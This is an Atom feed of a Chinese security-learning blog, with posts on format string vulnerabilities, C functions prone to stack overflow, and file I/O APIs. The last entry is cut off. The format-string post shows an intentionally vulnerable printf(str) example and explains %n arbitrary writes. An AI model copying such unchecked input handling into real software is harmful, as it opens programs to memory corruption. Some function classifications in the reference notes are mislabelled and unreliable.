<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nocbtm&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nocbtm.github.io/"/>
  <updated>2019-10-02T04:01:56.029Z</updated>
  <id>https://nocbtm.github.io/</id>
  
  <author>
    <name>nocbtm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>IO_FILE结构及利用</title>
    <link href="https://nocbtm.github.io/2019/10/02/IO-FILE%E7%BB%93%E6%9E%84%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2019/10/02/IO-FILE结构及利用/</id>
    <published>2019-10-02T01:56:23.000Z</published>
    <updated>2019-10-02T04:01:56.029Z</updated>
    
    <content type="html"><![CDATA[<p>(o≖◡≖)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;(o≖◡≖)&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="https://nocbtm.github.io/2018/11/29/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>https://nocbtm.github.io/2018/11/29/格式化字符串漏洞/</id>
    <published>2018-11-29T08:41:56.000Z</published>
    <updated>2019-10-01T08:30:40.759Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-什么是格式化字符串"><a href="#0x00-什么是格式化字符串" class="headerlink" title="0x00 什么是格式化字符串"></a>0x00 什么是格式化字符串</h2><p>学过c语言的都知道printf，fprintf，sprintf等这一类printf函数中经常用到”%”，后面加一个或多个字符串做说明符。<br>格式化字符串指的就是printf函数第一个参数，最常见的包括：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d - 十进制 - 输出十进制整数</span><br><span class="line">%s - 字符串 - 从内存中读取字符串</span><br><span class="line">%x - 十六进制 - 输出十六进制数</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址</span><br><span class="line">%n - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure></p><p>printf有一个特殊的格式化控制符%n，和其他控制输出格式和内容的格式化字符不同的是，这个格式化字符会将已输出的字符数写入到对应参数的内存中。<br>我们就利用这个漏洞实现任意地址写</p><h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><h3 id="产生漏洞的原因"><a href="#产生漏洞的原因" class="headerlink" title="产生漏洞的原因"></a>产生漏洞的原因</h3><p>就是没写格式化控制符,如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char str[100];</span><br><span class="line">scanf(&quot;%s&quot;,str);</span><br><span class="line">printf(str);</span><br></pre></td></tr></table></figure></p><p>事实上，这是一种非常危险的写法。由于printf函数族的设计缺陷，当其第一个参数可被控制时，攻击者将有机会对任意内存地址进行读写操作。</p><p>一般来说，每个函数的参数个数都是固定的，被调用的函数知道应该从内存中读取多少个变量，但printf是可变参数的函数，对可变参数的函数而言，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数的调用者传入的格式一个一个的打印出数据。由于编程者的疏忽，把格式化字符串的操纵权交给用户，就会产生后面任意地址读写的漏洞。</p><p>举个栗子，主函数如下：<br><img alt="" data-src="https://i.imgur.com/qQBQjaR.png" class="lozad"><br>程序很简单，可以多次输入方便调试，<br>memset函数先把buf都初始化为0，<br>然后read函数读取键盘操作，输入buf<br>最后在输出buf。</p><p><img alt="" data-src="https://i.imgur.com/Qc3mQgM.png" class="lozad"></p><p>正常情况下我们输入什么都会输出什么，但是当我们输入一些特定的字符时输出出现了变化。</p><h2 id="0x02利用格式化字符串漏洞实现任意地址读"><a href="#0x02利用格式化字符串漏洞实现任意地址读" class="headerlink" title="0x02利用格式化字符串漏洞实现任意地址读"></a>0x02利用格式化字符串漏洞实现任意地址读</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-什么是格式化字符串&quot;&gt;&lt;a href=&quot;#0x00-什么是格式化字符串&quot; class=&quot;headerlink&quot; title=&quot;0x00 什么是格式化字符串&quot;&gt;&lt;/a&gt;0x00 什么是格式化字符串&lt;/h2&gt;&lt;p&gt;学过c语言的都知道printf，fprint
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>从非缓冲系统文件到常见栈溢出函数</title>
    <link href="https://nocbtm.github.io/2018/11/12/%E4%BB%8E%E9%9D%9E%E7%BC%93%E5%86%B2%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E5%88%B0%E5%B8%B8%E8%A7%81%E6%A0%88%E6%BA%A2%E5%87%BA%E5%87%BD%E6%95%B0/"/>
    <id>https://nocbtm.github.io/2018/11/12/从非缓冲系统文件到常见栈溢出函数/</id>
    <published>2018-11-12T14:15:12.000Z</published>
    <updated>2019-10-01T08:37:25.212Z</updated>
    
    <content type="html"><![CDATA[<p>非缓冲和缓冲是相对而言的<br>了解什么是非缓冲文件系统之前，先了解一下缓冲文件系统。</p><h2 id="什么是缓冲文件系统？"><a href="#什么是缓冲文件系统？" class="headerlink" title="什么是缓冲文件系统？"></a>什么是缓冲文件系统？</h2><p>程序在运行过程中，会自动在内存开辟一个“缓冲区”，为程序中的每一个文件使用，当执行读文件的操作时，从磁盘文件将数据先读入内存“缓冲区”，装满后再从内存“缓冲区”依此读入接收的变量。执行写文件的操作时，先将数据写入内存“缓冲区”，待内存“缓冲区”装满后再写入文件。由此可以看出，内存“缓冲区”的大小，影响着实际操作外存的次数，内存“缓冲区”越大，则操作外存的次数就少，执行速度就快、效率高。一般来说，文件“缓冲区”的大小随机器而定。</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>用缓冲区可以一次读入一批数据，或输出一批数据，而不是执行一次输入或输出函数就去访问一次磁盘，这样做的目的是减少对磁盘的实际读写次数。</p><h3 id="代表函数-c语言"><a href="#代表函数-c语言" class="headerlink" title="代表函数(c语言)"></a>代表函数(c语言)</h3><p>缓冲文件系统，fopen, fclose, fread, fwrite, fgetc, fgets, fputc, fputs, freopen, fseek, ftell, rewind等</p><h2 id="非缓冲文件系统"><a href="#非缓冲文件系统" class="headerlink" title="非缓冲文件系统"></a>非缓冲文件系统</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>非缓冲文件系统不由系统自动设置缓冲区，而由用户自己根据需要设置。在传统的unix系统下，用缓冲文件系统来处理文本文件，用非缓冲文件系统处理二进制文件。</p><h3 id="代表函数"><a href="#代表函数" class="headerlink" title="代表函数"></a>代表函数</h3><p>缓冲文件系统，open, close, read, write, gets, getchar, putc, putchar等</p><h2 id="栈溢出常见函数"><a href="#栈溢出常见函数" class="headerlink" title="栈溢出常见函数"></a>栈溢出常见函数</h2><table><thead><tr><th style="text-align:left">函数</th><th style="text-align:right">功能</th><th style="text-align:center">可利用漏洞</th></tr></thead><tbody><tr><td style="text-align:left">read()</td><td style="text-align:right">读取文件内容到缓冲区</td><td style="text-align:center">读到\x00和指定字节</td></tr><tr><td style="text-align:left">write()</td><td style="text-align:right">把缓冲区的内容写入到文件内</td><td style="text-align:center">写到\x00和指定字节</td></tr><tr><td style="text-align:left">gets()</td><td style="text-align:right">从输入缓冲区中读取一个字符串存储到字符指针</td><td style="text-align:center">可无限输入</td></tr><tr><td style="text-align:left">puts()</td><td style="text-align:right">输出字符串,相当于printf(“%s\n”,s)</td><td style="text-align:center">输出直到\x00</td></tr><tr><td style="text-align:left">strcpy()</td><td style="text-align:right">只能复制字符串</td><td style="text-align:center">一直复制直到遇到\x00</td></tr><tr><td style="text-align:left">memcpy()</td><td style="text-align:right">复制任意内容</td><td style="text-align:center">指定字节</td></tr><tr><td style="text-align:left">strncpy()</td><td style="text-align:right">复制指定字节字符</td><td style="text-align:center">指定字节</td></tr><tr><td style="text-align:left">printf()</td><td style="text-align:right">格式化输出</td><td style="text-align:center">输出直到\x00</td></tr><tr><td style="text-align:left">scanf()</td><td style="text-align:right">格式化输入</td><td style="text-align:center">输入与定义不同的类型或输入多与定义的数组元素</td></tr></tbody></table><p>下面是详细内容:</p><h2 id="0x00-read"><a href="#0x00-read" class="headerlink" title="0x00 read()"></a>0x00 read()</h2><h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">ssize_t read (int fd, void *buf, size_t nbyte)</span><br></pre></td></tr></table></figure><p>fd：文件描述符；fd为0从键盘读取<br>buf：指定的缓冲区，即指针，指向一段内存单元；<br>nbyte：要读入文件指定的字节数；</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>read()会把参数fd所指的文件传送nbyte个字节到buf指针所指的内存中。若参数nbyte为0，则read()不会有作用并返回0。</p><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>成功时,read返回实际所读的字节数,如果返回的值是0,表示已经读到文件的结束了.<br>小于0表示出现了错误.如果错误为EINTR说明读是由中断引起的, 如果是ECONNREST表示网络连接出了问题.</p><h2 id="0x01-write"><a href="#0x01-write" class="headerlink" title="0x01 write()"></a>0x01 write()</h2><h3 id="函数原型-1"><a href="#函数原型-1" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">ssize_t write(int fd,const void *buf,size_t nbytes)</span><br></pre></td></tr></table></figure><p>fd：文件描述符；fd为1输出到显示器<br>buf：指定的缓冲区，即指针，指向一段内存单元；<br>nbyte：要写入文件指定的字节数；</p><h3 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h3><p>write()会把参数buf 所指的内存写入nbytes 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动.</p><h3 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h3><p>如果顺利write()会返回实际写入的字节数.<br>当有错误发生时则返回-1, 错误代码存入errno 中.</p><p>错误代码：</p><ul><li>EINTR 此调用被信号所中断.</li><li>EAGAIN 当使用不可阻断I/O 时 (O_NONBLOCK), 若无数据可读取则返回此值.</li><li>EADF 参数fd 非有效的文件描述词, 或该文件已关闭</li></ul><h2 id="0x02-gets"><a href="#0x02-gets" class="headerlink" title="0x02 gets()"></a>0x02 gets()</h2><h3 id="函数原型-2"><a href="#函数原型-2" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line">char *gets(char *str);</span><br></pre></td></tr></table></figure><h3 id="功能-2"><a href="#功能-2" class="headerlink" title="功能"></a>功能</h3><p>gets() 函数的功能是从输入缓冲区中读取一个字符串存储到字符指针变量 str 所指向的内存空间。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>使用 gets() 时，系统会将最后“敲”的换行符从缓冲区中取出来，然后丢弃，所以缓冲区中不会遗留换行符。这就意味着，如果前面使用过 gets()，而后面又要从键盘给字符变量赋值的话就不需要吸收回车清空缓冲区了，因为缓冲区的回车已经被 gets() 取出来扔掉了</p><p>gets() 时有空格也可以直接输入，但是 gets() 有一个非常大的缺陷，即它不检查预留存储区是否能够容纳实际输入的数据，换句话说，如果输入的字符数目大于数组的长度，gets 无法检测到这个问题，就会发生内存越界。</p><h2 id="0x03-strcpy-和memcpy-和strncpy"><a href="#0x03-strcpy-和memcpy-和strncpy" class="headerlink" title="0x03 strcpy()和memcpy()和strncpy()"></a>0x03 strcpy()和memcpy()和strncpy()</h2><h3 id="函数原型-3"><a href="#函数原型-3" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char* strcpy(char* dest, const char* src)</span><br><span class="line">void *memcpy( void *dest, const void *src, size_t count );</span><br><span class="line">char *strncpy(char *dest,char *src,int size_t n);</span><br></pre></td></tr></table></figure><p>dest:指向用于存储复制内容的目标数组。<br>src:要复制的字符串。<br>count：要读入文件指定的字节数；</p><h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><ul><li>strcpy提供了字符串的复制。即strcpy只用于字符串复制，并且它不仅复制字符串内容之外，还会复制字符串的结束符’\0’。</li><li>复制的内容不同。strcpy只能复制字符串，而memcpy可以复制任意内容，例如字符数组、整型、结构体、类等。</li><li>复制的方法不同。strcpy不需要指定长度，它遇到被复制字符的串结束符”\0”才结束，所以容易溢出。memcpy则是根据其第3个参数决定复制的长度。</li><li>用途不同。通常在复制字符串时用strcpy，而需要复制其他类型数据时则一般用memcpy</li><li>strncpy函数，只是将src的前n个字符复制到dest的前n个字符，不自动添加’\0’。如果src的长度小于n个字节，则以NULL填充dest直到复制完n个字节</li></ul><h2 id="0x04-printf-和scanf"><a href="#0x04-printf-和scanf" class="headerlink" title="0x04 printf()和scanf()"></a>0x04 printf()和scanf()</h2><p>引入：华为的一道经典面试</p><p><img alt="" data-src="https://i.imgur.com/frca7C7.png" class="lozad"></p><p>i的值输出是多少呢，没有考虑栈溢出的话，i就是5。可这里栈溢出了，i=6776421 ，这是为什么呢？<br>进入到内存中分析：<br>连续定义的变量，内存地址一般也相邻<br>首先依次在栈区为变量开辟空间（注意方式，整形是4个字节以计算，char型一字节一计算）<br>a,b,c,d,e对应的ASCII码对照表的16进制为0x61,0x62,0x63,0x64,0x65<br><img alt="" data-src="https://i.imgur.com/Rf8iJUJ.png" class="lozad"></p><p>越界后：<br><img alt="" data-src="https://i.imgur.com/s49ZZ2I.jpg" class="lozad"></p><p>所以最后的结果是0x676665的十进制6776421</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;非缓冲和缓冲是相对而言的&lt;br&gt;了解什么是非缓冲文件系统之前，先了解一下缓冲文件系统。&lt;/p&gt;
&lt;h2 id=&quot;什么是缓冲文件系统？&quot;&gt;&lt;a href=&quot;#什么是缓冲文件系统？&quot; class=&quot;headerlink&quot; title=&quot;什么是缓冲文件系统？&quot;&gt;&lt;/a&gt;什么是缓冲
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>open、fopen和popen</title>
    <link href="https://nocbtm.github.io/2018/11/07/open%E3%80%81fopen%E5%92%8Cpopen/"/>
    <id>https://nocbtm.github.io/2018/11/07/open、fopen和popen/</id>
    <published>2018-11-07T12:44:23.000Z</published>
    <updated>2019-10-01T08:39:31.897Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open"><a href="#open" class="headerlink" title="open"></a>open</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>打开设备文件<br>不带缓冲区<br>非缓冲文件系统依赖于操作系统，通过操作系统的功能对文件进行读写，是系统级的输入输出，它不设文件结构体指针，只能读写二进制文件，但效率高、速度 快</p><h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int open(const char *pathname, int flags);</span><br><span class="line">int open(const char *pathname, int flags, mode_t mode);</span><br><span class="line"></span><br><span class="line">所需库：</span><br><span class="line">#include &lt;sys/types.h&gt;    </span><br><span class="line">#include &lt;sys/stat.h&gt;    </span><br><span class="line">#include &lt;fcntl.h&gt;</span><br></pre></td></tr></table></figure><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>成功则返回文件描述符，否则返回 -1;</p><h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><p>参数 pathname 指向欲打开的文件路径字符串. 下列是参数flags 所能使用的旗标:</p><ul><li>O_RDONLY 以只读方式打开文件</li><li>O_WRONLY 以只写方式打开文件</li><li>O _RDWR 以可读写方式打开文件. 上述三种旗标是互斥的, 也就是不可同时使用, 但可与下列的旗标利用OR(|)运算符组合.</li><li>O_CREAT 若欲打开的文件不存在则自动建立该文件.</li><li>O_EXCL 如果O_CREAT 也被设置, 此指令会去检查文件是否存在. 文件若不存在则建立该文件, 否则将导致打开文件错误. 此外, 若O_CREAT 与O_EXCL 同时设置, 并且欲打开的文件为符号连接, 则会打开文件失败.</li><li>O_NOCTTY 如果欲打开的文件为终端机设备时, 则不会将该终端机当成进程控制终端机.</li><li>O_TRUNC 若文件存在并且以可写的方式打开时, 此旗标会令文件长度清为0, 而原来存于该文件的资料也会消失.</li><li>O_APPEND 当读写文件时会从文件尾开始移动, 也就是所写入的数据会以附加的方式加入到文件后面.</li><li>O_NONBLOCK 以不可阻断的方式打开文件, 也就是无论有无数据读取或等待, 都会立即返回进程之中.</li><li>O_NDELAY 同O_NONBLOCK.</li><li>O_SYNC 以同步的方式打开文件.</li><li>O_NOFOLLOW 如果参数pathname 所指的文件为一符号连接, 则会令打开文件失败.</li><li>O_DIRECTORY 如果参数pathname 所指的文件并非为一目录, 则会令打开文件失败。注：此为Linux2. 2 以后特有的旗标, 以避免一些系统安全问题. </li></ul><p>参数mode 则有下列数种组合, 只有在建立新文件时才会生效, 此外真正建文件时的权限会受到umask 值所影响, 因此该文件权限应该为 (mode-umaks).</p><ul><li>S_IRWXU00700 权限, 代表该文件所有者具有可读、可写及可执行的权限.</li><li>S_IRUSR 或S_IREAD, 00400 权限, 代表该文件所有者具有可读取的权限.</li><li>S_IWUSR 或S_IWRITE, 00200 权限, 代表该文件所有者具有可写入的权限.</li><li>S_IXUSR 或S_IEXEC, 00100 权限, 代表该文件所有者具有可执行的权限.</li><li>S_IRWXG 00070 权限, 代表该文件用户组具有可读、可写及可执行的权限.</li><li>S_IRGRP 00040 权限, 代表该文件用户组具有可读的权限.</li><li>S_IWGRP 00020 权限, 代表该文件用户组具有可写入的权限.</li><li>S_IXGRP 00010 权限, 代表该文件用户组具有可执行的权限.</li><li>S_IRWXO 00007 权限, 代表其他用户具有可读、可写及可执行的权限.</li><li>S_IROTH 00004 权限, 代表其他用户具有可读的权限</li><li>S_IWOTH 00002 权限, 代表其他用户具有可写入的权限.</li><li>S_IXOTH 00001 权限, 代表其他用户具有可执行的权限.</li></ul><p>返回值：若所有欲核查的权限都通过了检查则返回0 值, 表示成功, 只要有一个权限被禁止则返回-1.</p><p>错误代码：</p><ul><li>EEXIST 参数pathname 所指的文件已存在, 却使用了O_CREAT 和-O_EXCL 旗标.</li><li>EACCESS 参数pathname 所指的文件不符合所要求测试的权限.</li><li>EROFS 欲测试写入权限的文件存在于只读文件系统内.</li><li>EFAULT 参数pathname 指针超出可存取内存空间.</li><li>EINVAL 参数mode 不正确.</li><li>ENAMETOOLONG 参数 pathname 太长.</li><li>ENOTDIR 参数pathname 不是目录.</li><li>ENOMEM 核心内存不足.</li><li>ELOOP 参数pathname 有过多符号连接问题.</li><li>EIO I/O 存取错误.</li></ul><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>打开普通文件<br>带缓冲区<br>缓冲文件系统是借助文件结构体指针来对文件进行管理，通过文件指针来对文件进行访问，既可以读写字符、字符串、格式化数据，也可以读写二进制数据。</p><h3 id="函数原型-1"><a href="#函数原型-1" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">FILE * fopen(const char * path,const char * mode);</span><br></pre></td></tr></table></figure><h3 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h3><p>文件顺利打开后，指向该流的文件指针就会被返回。如果文件打开失败则返回NULL，并把错误代码存在errno 中。</p><h3 id="参数说明-1"><a href="#参数说明-1" class="headerlink" title="参数说明"></a>参数说明</h3><p>参数path字符串包含欲打开的文件路径及文件名，参数mode字符串则代表着流形态。<br>mode有下列几种形态字符串:<br>r 以只读方式打开文件，该文件必须存在。<br>r+ 以可读写方式打开文件，该文件必须存在。<br>rb+ 读写打开一个二进制文件，允许读写数据。<br>rw+ 读写打开一个文本文件，允许读和写。<br>w 打开只写文件，若文件存在则文件长度清为0，即该文件内容会消失。若文件不存在则建立该文件。<br>w+ 打开可读写文件，若文件存在则文件长度清为零，即该文件内容会消失。若文件不存在则建立该文件。<br>a 以附加的方式打开只写文件。若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾，即文件原先的内容会被保留。（EOF符保留）<br>a+ 以附加方式打开可读写的文件。若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾后，即文件原先的内容会被保留。 （原来的EOF符不保留）<br>wb 只写打开或新建一个二进制文件；只允许写数据。<br>wb+ 读写打开或建立一个二进制文件，允许读和写。<br>ab+ 读写打开一个二进制文件，允许读或在文件末追加数据。<br>at+ 打开一个叫string的文件，a表示append,就是说写入处理的时候是接着原来文件已有内容写入，不是从头写入覆盖掉，t表示打开文件的类型是文本文件，+号表示对文件既可以读也可以写。<br>上述的形态字符串都可以再加一个b字符，如rb、w+b或ab+等组合，加入b 字符用来告诉函数库以二进制模式打开文件。如果不加b，表示默认加了t，即rt,wt,其中t表示以文本模式打开文件。由fopen()所建立的新文件会具有S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH(0666)权限，此文件权限也会参考umask 值。<br>有些C编译系统可能不完全提供所有这些功能，有的C版本不用”r+”,”w+”,”a+”,而用”rw”,”wr”,”ar”等，读者注意所用系统的规定。</p><h2 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h2><h3 id="函数原型-2"><a href="#函数原型-2" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">FILE * popen ( const char * command , const char * type );</span><br></pre></td></tr></table></figure><h3 id="返回值-2"><a href="#返回值-2" class="headerlink" title="返回值"></a>返回值</h3><p>如果调用 fork() 或 pipe() 失败，或者不能分配内存将返回NULL，否则返回标准 I/O 流。</p><h3 id="参数说明-2"><a href="#参数说明-2" class="headerlink" title="参数说明"></a>参数说明</h3><p>type 参数只能是读或者写中的一种，得到的返回值（标准 I/O 流）也具有和 type 相应的只读或只写类型。如果 type 是 “r” 则文件指针连接到 command 的标准输出；如果 type 是 “w” 则文件指针连接到 command 的标准输入。<br>command 参数是一个指向以 NULL 结束的 shell 命令字符串的指针。这行命令将被传到 bin/sh 并使用-c 标志，shell 将执行这个命令。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open&quot;&gt;&lt;a href=&quot;#open&quot; class=&quot;headerlink&quot; title=&quot;open&quot;&gt;&lt;/a&gt;open&lt;/h2&gt;&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h
      
    
    </summary>
    
      <category term="c" scheme="https://nocbtm.github.io/categories/c/"/>
    
    
      <category term="c" scheme="https://nocbtm.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>缓冲文件系统和非缓冲文件系统</title>
    <link href="https://nocbtm.github.io/2018/11/05/%E7%BC%93%E5%86%B2%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%92%8C%E9%9D%9E%E7%BC%93%E5%86%B2%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    <id>https://nocbtm.github.io/2018/11/05/缓冲文件系统和非缓冲文件系统/</id>
    <published>2018-11-05T10:31:52.000Z</published>
    <updated>2019-10-01T08:30:17.631Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>1983 年ANSI C 标准决定不采用非缓冲文件系统，而只采用缓冲文件系统。即用缓冲文件系统处理文本文件，也用它来处理二进制文件。也就是将缓冲文件系统扩充为可以处理二进制文件。</p><h2 id="缓冲文件系统"><a href="#缓冲文件系统" class="headerlink" title="缓冲文件系统"></a>缓冲文件系统</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>自动在内存开辟一个“缓冲区”，为程序中的每一个文件使用，当执行读文件的操作时，从磁盘文件将数据先读入内存“缓冲区”，装满后再从内存“缓冲区”依此读入接收的变量。执行写文件的操作时，先将数据写入内存“缓冲区”，待内存“缓冲区”装满后再写入文件。由此可以看出，内存“缓冲区”的大小，影响着实际操作外存的次数，内存“缓冲区”越大，则操作外存的次数就少，执行速度就快、效率高。一般来说，文件“缓冲区”的大小随机器而定。</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>用缓冲区可以一次读入一批数据，或输出一批数据，而不是执行一次输入或输出函数就去访问一次磁盘，这样做的目的是减少对磁盘的实际读写次数。</p><h3 id="代表函数"><a href="#代表函数" class="headerlink" title="代表函数"></a>代表函数</h3><p>缓冲文件系统，fopen, fclose, fread, fwrite, fgetc, fgets, fputc, fputs, freopen, fseek, ftell, rewind等</p><h2 id="非缓冲文件系统"><a href="#非缓冲文件系统" class="headerlink" title="非缓冲文件系统"></a>非缓冲文件系统</h2><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><p>非缓冲文件系统不由系统自动设置缓冲区，而由用户自己根据需要设置。在传统的unix系统下，用缓冲文件系统来处理文本文件，用非缓冲文件系统处理二进制文件。</p><h3 id="代表函数-1"><a href="#代表函数-1" class="headerlink" title="代表函数"></a>代表函数</h3><p>缓冲文件系统，open, close, read, write, gets, getchar, putc, putchar等</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;1983 年ANSI C 标准决定不采用非缓冲文件系统，而只采用缓冲文件系统。即用缓冲文件系统处理文本文件，也用它来处理二进制文件。也就是将
      
    
    </summary>
    
      <category term="linux" scheme="https://nocbtm.github.io/categories/linux/"/>
    
    
      <category term="linux" scheme="https://nocbtm.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出常见函数</title>
    <link href="https://nocbtm.github.io/2018/11/04/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/"/>
    <id>https://nocbtm.github.io/2018/11/04/栈溢出常见函数/</id>
    <published>2018-11-04T11:17:08.000Z</published>
    <updated>2019-10-01T08:27:33.168Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-read"><a href="#0x00-read" class="headerlink" title="0x00 read()"></a>0x00 read()</h2><h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">ssize_t read (int fd, void *buf, size_t nbyte)</span><br></pre></td></tr></table></figure><p>fd：文件描述符；fd为0从键盘读取<br>buf：指定的缓冲区，即指针，指向一段内存单元；<br>nbyte：要读入文件指定的字节数；</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>read()会把参数fd所指的文件传送nbyte个字节到buf指针所指的内存中。若参数nbyte为0，则read()不会有作用并返回0。</p><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>成功时,read返回实际所读的字节数,如果返回的值是0,表示已经读到文件的结束了.<br>小于0表示出现了错误.如果错误为EINTR说明读是由中断引起的, 如果是ECONNREST表示网络连接出了问题.</p><h2 id="0x01-write"><a href="#0x01-write" class="headerlink" title="0x01 write()"></a>0x01 write()</h2><h3 id="函数原型-1"><a href="#函数原型-1" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">ssize_t write(int fd,const void *buf,size_t nbytes)</span><br></pre></td></tr></table></figure><p>fd：文件描述符；fd为1输出到显示器<br>buf：指定的缓冲区，即指针，指向一段内存单元；<br>nbyte：要写入文件指定的字节数；</p><h3 